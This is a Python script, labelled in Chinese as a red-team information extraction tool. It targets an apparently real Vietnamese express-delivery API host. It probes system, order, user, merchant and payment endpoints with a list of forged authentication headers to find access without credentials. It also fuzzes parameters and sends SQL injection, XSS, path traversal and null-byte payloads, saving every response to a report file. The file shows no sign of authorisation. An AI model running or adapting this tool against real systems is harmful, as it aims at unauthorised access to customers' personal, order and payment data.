#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
红队信息提取工具 - 深度获取敏感信息
顶级红队安全专家专用工具
"""

import requests
import json
import time
import hashlib
import random
import string
from datetime import datetime
import urllib3
from urllib.parse import urljoin, urlparse, quote, unquote

# 禁用SSL警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class RedTeamInfoExtractor:
    def __init__(self):
        self.base_url = "http://ws.ems.com.vn"
        self.session = requests.Session()
        self.session.verify = False
        self.session.timeout = 15
        self.results = {}
        self.session_id = hashlib.md5(f"redteam_extract_{int(time.time())}".encode()).hexdigest()[:8]
        
        # 设置请求头
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9,vi;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'X-Requested-With': 'XMLHttpRequest'
        })
    
    def log(self, message, level="INFO"):
        """日志记录"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(f"[{timestamp}] [{level}] {message}")
    
    def test_endpoint_with_auth(self, endpoint, auth_methods):
        """使用不同认证方法测试端点"""
        results = {}
        
        for auth_name, auth_headers in auth_methods.items():
            self.log(f"🔐 测试 {endpoint} - {auth_name}", "INFO")
            
            try:
                test_headers = self.session.headers.copy()
                test_headers.update(auth_headers)
                
                # GET请求
                get_response = self.session.get(urljoin(self.base_url, endpoint), headers=test_headers)
                results[f"{auth_name}_GET"] = {
                    'status_code': get_response.status_code,
                    'headers': dict(get_response.headers),
                    'content': get_response.text[:2000],
                    'size': len(get_response.content)
                }
                
                # POST请求
                post_data = {
                    "test": "redteam_extraction",
                    "timestamp": int(time.time()),
                    "random": ''.join(random.choices(string.ascii_letters + string.digits, k=10))
                }
                post_response = self.session.post(urljoin(self.base_url, endpoint), json=post_data, headers=test_headers)
                results[f"{auth_name}_POST"] = {
                    'status_code': post_response.status_code,
                    'headers': dict(post_response.headers),
                    'content': post_response.text[:2000],
                    'size': len(post_response.content)
                }
                
                time.sleep(0.5)
                
            except Exception as e:
                results[f"{auth_name}_ERROR"] = str(e)
        
        return results
    
    def extract_system_info(self):
        """提取系统信息"""
        self.log("🔍 提取系统信息", "INFO")
        
        system_endpoints = [
            "/api/v1/config/service",
            "/api/v1/metadata/vas",
            "/api/v1/address/province-and-district",
            "/api/v1/orders/count-group",
            "/api/v1/tickets/count-group",
            "/api/v1/merchants/update-token",
            "/api/v1/order-intl/country/",
            "/api/v1/order-intl/item-type"
        ]
        
        auth_methods = {
            "no_auth": {},
            "basic_auth": {"Authorization": "Basic dGVzdDp0ZXN0"},
            "bearer_token": {"Authorization": "Bearer test_token"},
            "api_key": {"X-API-Key": "test_key"},
            "custom_header": {"X-Auth-Token": "test_token"},
            "user_agent": {"User-Agent": "EMS-Portal-Android/2.3.0"},
            "referer": {"Referer": "https://ems.com.vn"},
            "origin": {"Origin": "https://ems.com.vn"}
        }
        
        system_info = {}
        
        for endpoint in system_endpoints:
            self.log(f"🔍 提取 {endpoint}", "INFO")
            results = self.test_endpoint_with_auth(endpoint, auth_methods)
            system_info[endpoint] = results
            time.sleep(1)
        
        self.results['系统信息'] = system_info
        return system_info
    
    def extract_order_info(self):
        """提取订单信息"""
        self.log("📦 提取订单信息", "INFO")
        
        order_endpoints = [
            "/api/v1/orders/list",
            "/api/v1/orders/create-v2",
            "/api/v1/orders/tracking/",
            "/api/v1/orders/quotes",
            "/api/v1/orders/order-cod",
            "/api/v1/orders/summary",
            "/api/v1/orders/cod-by-date",
            "/api/v1/order-intl/list",
            "/api/v1/order-intl/create",
            "/api/v1/order-intl/calculate",
            "/api/v1/order-intl/tracking/"
        ]
        
        auth_methods = {
            "no_auth": {},
            "basic_auth": {"Authorization": "Basic dGVzdDp0ZXN0"},
            "bearer_token": {"Authorization": "Bearer test_token"},
            "api_key": {"X-API-Key": "test_key"},
            "custom_header": {"X-Auth-Token": "test_token"},
            "user_agent": {"User-Agent": "EMS-Portal-Android/2.3.0"},
            "referer": {"Referer": "https://ems.com.vn"},
            "origin": {"Origin": "https://ems.com.vn"}
        }
        
        order_info = {}
        
        for endpoint in order_endpoints:
            self.log(f"📦 提取 {endpoint}", "INFO")
            results = self.test_endpoint_with_auth(endpoint, auth_methods)
            order_info[endpoint] = results
            time.sleep(1)
        
        self.results['订单信息'] = order_info
        return order_info
    
    def extract_user_info(self):
        """提取用户信息"""
        self.log("👤 提取用户信息", "INFO")
        
        user_endpoints = [
            "/api/v1/user/profile",
            "/api/v1/user/info",
            "/api/v1/user/settings",
            "/api/v1/user/account",
            "/api/v1/merchants/info",
            "/api/v1/merchants/profile",
            "/api/v1/merchants/settings",
            "/api/v1/auth/user",
            "/api/v1/auth/profile",
            "/api/v1/auth/info"
        ]
        
        auth_methods = {
            "no_auth": {},
            "basic_auth": {"Authorization": "Basic dGVzdDp0ZXN0"},
            "bearer_token": {"Authorization": "Bearer test_token"},
            "api_key": {"X-API-Key": "test_key"},
            "custom_header": {"X-Auth-Token": "test_token"},
            "user_agent": {"User-Agent": "EMS-Portal-Android/2.3.0"},
            "referer": {"Referer": "https://ems.com.vn"},
            "origin": {"Origin": "https://ems.com.vn"}
        }
        
        user_info = {}
        
        for endpoint in user_endpoints:
            self.log(f"👤 提取 {endpoint}", "INFO")
            results = self.test_endpoint_with_auth(endpoint, auth_methods)
            user_info[endpoint] = results
            time.sleep(1)
        
        self.results['用户信息'] = user_info
        return user_info
    
    def extract_payment_info(self):
        """提取支付信息"""
        self.log("💳 提取支付信息", "INFO")
        
        payment_endpoints = [
            "/api/v1/payment/methods",
            "/api/v1/payment/process",
            "/api/v1/payment/history",
            "/api/v1/payment/status",
            "/api/v1/cod/payment",
            "/api/v1/cod/history",
            "/api/v1/cod/status",
            "/api/v1/finance/balance",
            "/api/v1/finance/transactions",
            "/api/v1/finance/reports"
        ]
        
        auth_methods = {
            "no_auth": {},
            "basic_auth": {"Authorization": "Basic dGVzdDp0ZXN0"},
            "bearer_token": {"Authorization": "Bearer test_token"},
            "api_key": {"X-API-Key": "test_key"},
            "custom_header": {"X-Auth-Token": "test_token"},
            "user_agent": {"User-Agent": "EMS-Portal-Android/2.3.0"},
            "referer": {"Referer": "https://ems.com.vn"},
            "origin": {"Origin": "https://ems.com.vn"}
        }
        
        payment_info = {}
        
        for endpoint in payment_endpoints:
            self.log(f"💳 提取 {endpoint}", "INFO")
            results = self.test_endpoint_with_auth(endpoint, auth_methods)
            payment_info[endpoint] = results
            time.sleep(1)
        
        self.results['支付信息'] = payment_info
        return payment_info
    
    def test_parameter_manipulation(self):
        """测试参数操作"""
        self.log("🔧 测试参数操作", "INFO")
        
        test_endpoints = [
            "/api/v1/orders/list",
            "/api/v1/orders/tracking/123456",
            "/api/v1/tickets/list",
            "/api/v1/inventory/list"
        ]
        
        parameter_tests = [
            # 空参数
            {},
            
            # 基本参数
            {"page": 1, "limit": 10},
            {"status": "active"},
            {"type": "all"},
            
            # 特殊参数
            {"format": "json"},
            {"detailed": True},
            {"include": "all"},
            {"fields": "id,name,status"},
            
            # 时间参数
            {"start_date": "2025-01-01"},
            {"end_date": "2025-12-31"},
            {"date_range": "30d"},
            
            # 分页参数
            {"page": 1, "per_page": 50},
            {"offset": 0, "limit": 100},
            {"skip": 0, "take": 25},
            
            # 排序参数
            {"sort": "created_at"},
            {"order": "desc"},
            {"sort_by": "id", "sort_order": "asc"},
            
            # 过滤参数
            {"filter": "active"},
            {"status": "pending"},
            {"category": "express"},
            
            # 搜索参数
            {"search": "test"},
            {"q": "order"},
            {"keyword": "express"},
            
            # 语言参数
            {"lang": "vi"},
            {"locale": "vi_VN"},
            {"language": "vietnamese"}
        ]
        
        manipulation_results = {}
        
        for endpoint in test_endpoints:
            self.log(f"🔧 测试 {endpoint}", "INFO")
            endpoint_results = {}
            
            for i, params in enumerate(parameter_tests):
                try:
                    # GET请求
                    get_response = self.session.get(urljoin(self.base_url, endpoint), params=params)
                    endpoint_results[f"GET_params_{i+1}"] = {
                        'status_code': get_response.status_code,
                        'content': get_response.text[:1000],
                        'params': params
                    }
                    
                    # POST请求
                    post_response = self.session.post(urljoin(self.base_url, endpoint), json=params)
                    endpoint_results[f"POST_params_{i+1}"] = {
                        'status_code': post_response.status_code,
                        'content': post_response.text[:1000],
                        'params': params
                    }
                    
                    time.sleep(0.3)
                    
                except Exception as e:
                    endpoint_results[f"ERROR_{i+1}"] = str(e)
            
            manipulation_results[endpoint] = endpoint_results
            time.sleep(1)
        
        self.results['参数操作'] = manipulation_results
        return manipulation_results
    
    def test_error_handling(self):
        """测试错误处理"""
        self.log("⚠️ 测试错误处理", "INFO")
        
        error_tests = [
            # 无效端点
            "/api/v1/invalid/endpoint",
            "/api/v1/orders/invalid",
            "/api/v1/nonexistent",
            
            # 无效参数
            "/api/v1/orders/list?invalid=param",
            "/api/v1/orders/tracking/invalid_id",
            "/api/v1/orders/create-v2?test=invalid",
            
            # 特殊字符
            "/api/v1/orders/list?test=<script>alert('xss')</script>",
            "/api/v1/orders/list?test=../../../etc/passwd",
            "/api/v1/orders/list?test=' OR 1=1--",
            
            # 长参数
            "/api/v1/orders/list?test=" + "A" * 1000,
            "/api/v1/orders/list?test=" + "B" * 5000,
            
            # 特殊编码
            "/api/v1/orders/list?test=%00",
            "/api/v1/orders/list?test=%0a%0d",
            "/api/v1/orders/list?test=%20%20%20",
            
            # 数组参数
            "/api/v1/orders/list?ids[]=1&ids[]=2&ids[]=3",
            "/api/v1/orders/list?filters[]=active&filters[]=pending",
            
            # 重复参数
            "/api/v1/orders/list?id=1&id=2&id=3",
            "/api/v1/orders/list?status=active&status=pending"
        ]
        
        error_results = {}
        
        for i, test_url in enumerate(error_tests):
            self.log(f"⚠️ 测试错误 {i+1}", "INFO")
            
            try:
                response = self.session.get(urljoin(self.base_url, test_url))
                error_results[f"error_test_{i+1}"] = {
                    'url': test_url,
                    'status_code': response.status_code,
                    'content': response.text[:1000],
                    'headers': dict(response.headers)
                }
                
                time.sleep(0.5)
                
            except Exception as e:
                error_results[f"error_test_{i+1}"] = {
                    'url': test_url,
                    'error': str(e)
                }
        
        self.results['错误处理'] = error_results
        return error_results
    
    def generate_extraction_report(self):
        """生成提取报告"""
        self.log("📋 生成提取报告", "INFO")
        
        report = {
            "session_id": self.session_id,
            "timestamp": datetime.now().isoformat(),
            "base_url": self.base_url,
            "results": self.results,
            "summary": {
                "total_endpoints_tested": sum(len(v) if isinstance(v, dict) else 0 for v in self.results.values()),
                "successful_responses": len([r for r in self.results.get('系统信息', {}).values() if isinstance(r, dict) and any('status_code' in sub_r for sub_r in r.values() if isinstance(sub_r, dict))]),
                "error_responses": len([r for r in self.results.get('错误处理', {}).values() if isinstance(r, dict) and r.get('status_code', 0) >= 400]),
                "vulnerabilities_found": len([k for k, v in self.results.items() if k.endswith('信息') and v]),
                "risk_level": "HIGH" if len([k for k, v in self.results.items() if k.endswith('信息') and v]) > 0 else "MEDIUM"
            }
        }
        
        # 保存报告
        report_file = f"/tmp/redteam_extraction_report_{self.session_id}.json"
        with open(report_file, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
        
        self.log(f"📋 报告已保存: {report_file}", "SUCCESS")
        return report
    
    def run_full_extraction(self):
        """运行完整提取"""
        self.log("🚀 启动红队信息提取", "INFO")
        self.log("=" * 60, "INFO")
        
        # 1. 提取系统信息
        self.extract_system_info()
        
        # 2. 提取订单信息
        self.extract_order_info()
        
        # 3. 提取用户信息
        self.extract_user_info()
        
        # 4. 提取支付信息
        self.extract_payment_info()
        
        # 5. 测试参数操作
        self.test_parameter_manipulation()
        
        # 6. 测试错误处理
        self.test_error_handling()
        
        # 7. 生成报告
        report = self.generate_extraction_report()
        
        self.log("🎯 红队信息提取完成！", "SUCCESS")
        self.log(f"风险等级: {report['summary']['risk_level']}", "WARNING")
        self.log(f"测试端点: {report['summary']['total_endpoints_tested']}", "SUCCESS")
        self.log(f"成功响应: {report['summary']['successful_responses']}", "SUCCESS")
        self.log(f"错误响应: {report['summary']['error_responses']}", "ERROR")
        self.log(f"发现漏洞: {report['summary']['vulnerabilities_found']}", "WARNING")
        
        return report

def main():
    extractor = RedTeamInfoExtractor()
    extractor.run_full_extraction()

if __name__ == "__main__":
    main()